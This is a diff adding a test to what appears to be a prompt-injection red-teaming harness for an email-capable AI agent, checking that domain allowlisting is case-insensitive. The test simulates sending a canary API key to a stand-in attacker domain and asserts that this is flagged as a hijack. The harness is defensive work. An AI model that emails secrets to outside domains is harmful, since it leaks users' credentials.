@@ -356,3 +356,36 @@ def test_bad_setup_errors_one_attack_not_the_whole_run(monkeypatch) -> None:
     # Errored attack is counted nowhere: only GOOD-1 is in the totals.
     assert results.total_attacks == 1
     assert "BAD-1" not in results.by_category.get("LLM01: Prompt Injection", {})
+
+
+def test_allowed_domain_check_is_case_insensitive() -> None:
+    """One lowercasing helper backs the runner checks, _hijack_actions, and the agent."""
+    from redteam.defenses import GUARDED_CONFIG
+    from redteam.runner import _hijack_actions
+    from redteam.target.agent import Agent, domain_allowed, email_domain
+    from redteam.target.model import RuleBasedModel, ToolCall
+    from redteam.target.tools import CANARY_API_KEY, FakeToolkit
+
+    assert email_domain("x@Example.COM") == "example.com"
+    assert domain_allowed("x@Example.COM", {"example.com"})
+    assert not domain_allowed("x@EVIL.com", {"example.com", "company.com"})
+
+    guarded = AttackRunner("guarded")
+
+    # Agent guarded allowlist: a mixed-case allowed domain is NOT blocked.
+    agent = Agent(model=RuleBasedModel("guarded"), toolkit=FakeToolkit(), config=GUARDED_CONFIG)
+    res = agent._execute_tool(
+        ToolCall("send_email", {"to": "x@Example.COM", "subject": "s", "body": "hi"})
+    )
+    assert res.success, res.data
+
+    # email_to_unauthorized_domain: mixed-case allowed domain with a secret is NOT flagged.
+    tk_ok = FakeToolkit()
+    tk_ok.send_email("x@Example.COM", "s", f"api_key={CANARY_API_KEY}")
+    assert not guarded._evaluate_check("email_to_unauthorized_domain", tk_ok, [])
+
+    # A mixed-case attacker domain with a secret IS flagged, and counts as a hijack.
+    tk_bad = FakeToolkit()
+    tk_bad.send_email("x@Attacker.COM", "s", f"api_key={CANARY_API_KEY}")
+    assert guarded._evaluate_check("email_to_unauthorized_domain", tk_bad, [])
+    assert any("unauthorized domain attacker.com" in a for a in _hijack_actions(tk_bad, []))
